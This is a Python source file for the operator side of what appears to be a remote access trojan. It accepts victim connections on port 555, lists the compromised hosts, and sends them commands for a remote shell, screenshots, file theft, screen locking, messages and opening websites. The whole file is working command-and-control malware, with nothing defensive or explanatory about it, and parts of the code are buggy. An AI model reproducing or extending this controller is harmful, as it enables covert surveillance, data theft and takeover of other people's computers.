import socket
import os
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
arr_jobs = [1, 2]
queue = Queue()
addresses = []
connections = []
host = '0.0.0.0'
port = 555
buffer_length = 4096
decode_udf = lambda data: data.decode("utf-8")
remove_quotes = lambda str: str.replace("\\", '')
center = lambda string, title: f"{{:^{len(string)}}}".format(title)


def recv_all(buffer):
    data = b''
    while True:
        part = client.recv(buffer)
        if (len(part) == buffer):
            return part
        data += part
        if len(data) == buffer:
            return data.decode()


def select_connection(connection_id, blnGetResponse):
    global conn, arr_info
    try:
        connection_id = int(connection_id)
        conn = connections[connection_id]
    except:
        print('Invalid choice, please try again')
        return
    else:
        arr_info = str(addresses[connection_id][0]), str(addresses[connection_id][2]), \
            str(addresses[connection_id][3]), str(addresses[connection_id][4])
        if blnGetResponse == 'True':
            print("You are connected to " + arr_info[0] + ' ......\n')
        return conn


def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()
    queue.join()


def create_jobs():
    for NUMBER_OF_THREADS in arr_jobs:
        queue.put(NUMBER_OF_THREADS)
    queue.join()


def work():
    while True:
        value = queue.get()
        if value == 1:
            establishment()
        elif value == 2:
            while True:
                time.sleep(0.2)
                if len(addresses) > 0:
                    main_manu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def screen_shot():
    client.send('screen'.encode())
    response = client.recv(buffer_length).decode()
    print("\n" + response)
    buffer = ""
    for counter in range(len(response)):
        if response[counter].isdigit():
            buffer += response[counter]
    buffer = int(buffer)
    file = time.strftime("%Y%m%d%H%M$S" + ".png")
    data = recv_all(buffer)
    picture = open(file, 'wb')
    picture.write(data)
    picture.close()
    print("Done!!!\ntotal bytes received")


def send_commands():
    while True:
        choice = input('\nType Selection: ')
        if choice[:3] == "--m" and len(choice) > 3:
            msg = "msg" + choice[4:]
            client.send(msg.encode())
        elif choice[:3] == '--o' and len(choice) > 3:
            site = 'site' + choice[4:]
            client.send(site.encode())
        elif choice == '--x 1':
            client.send("lock".encode())
        elif choice[:3] == '--p':
            screen_shot()
        elif choice[:4]=='--cp':
            client.send("download".encode())
            client.send(choice[5:].encode())
            recv_file()
        elif choice[:3]=='--o'and len(choice)>3:
            site='site'+choice[4:]
            client.send(site.encode())
        elif choice == '--e':
            command_shell()
        elif choice=='--x':
            break
def menu_help():
    print("\n" + "...help")
    print("--l List all our connections")


def main_manu():
    while True:
        choice = input("\n>> ")
        if choice == "--l":
            list_connections()
        elif choice == "--x":
            break
        elif choice[:3] == '--i' and len(choice) > 3:
            conn = select_connection(choice[4:], 'True')
            if conn is not None:
                send_commands()
        else:
            print("invalid choice")
            menu_help()


def close():
    if len(addresses) == 0:
        return
    for counter, connection in enumerate(connections):
        connection.send("exit".encode())
        connection.close()
    # del connections; connections=[]
    # del addresses;addresses=[]

def recv_file():
    file_name=client.recv(buffer_length).decode()
    if file_name=="the file does not exist":
        return
    size=int(client.recv(buffer_length).decode())
    data=b''
    while size>0:
        buffer=client.recv(buffer_length)
        data+=buffer
        size-=len(buffer)
    with open(file_name,'wb')as f:
        f.write(data)
    print("the file has arrived")
def list_connections():
    if len(connections) > 0:
        str_clients = ""
        for counter, connection in enumerate(connections):
            str_clients += (str(counter) + 4 * " " + str(addresses[counter][0]) + 4 * ' ' +
                            str(addresses[counter][1]) + 4 * " " +
                            str(addresses[counter][2]) + 4 * " " +
                            str(addresses[counter][3]) + "\n")
        print("\nID   " + center(str(addresses[0][0]), "IP") + 4 * " " + center(str(addresses[0][1]), "Port") + 4 * " ",
              center(str(addresses[0][2]), "PC Name") + 4 * " " + center(str(addresses[0][3]), "OS") + '\n',
              str_clients, end="")
    else:
        print("Not connections")


def establishment():
    global server
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(20)


def command_shell():
    client.send("cmd".encode())
    default = f'\n+{client.recv(buffer_length).decode()}>'
    print(default, end="")
    while True:
        command = input()
        if command == "quit" or command == "exit":
            client.send("goback".encode())
            break
        elif command == 'cmd':
            print("Please do not use this command...")
        elif len(command) > 0:
            client.send(command.encode())
            buffer = int(client.recv(buffer_length).decode())
            response = f"\n{recv_all(buffer).decode()}"
            print(response, end="")
        else:
            print(default, end="")


create_threads()
create_jobs()
while True:
    try:
        client, address = server.accept()
        client.setblocking(1)
        connections.append(client)
        data = client.recv(buffer_length).decode().split("',")
        address += data[0], data[1], data[2]
        addresses.append(address)
        print(f"connection has been established: {address[0]} {address[2]}")
    except socket.error:
        print("An error with the connection happened")
        continue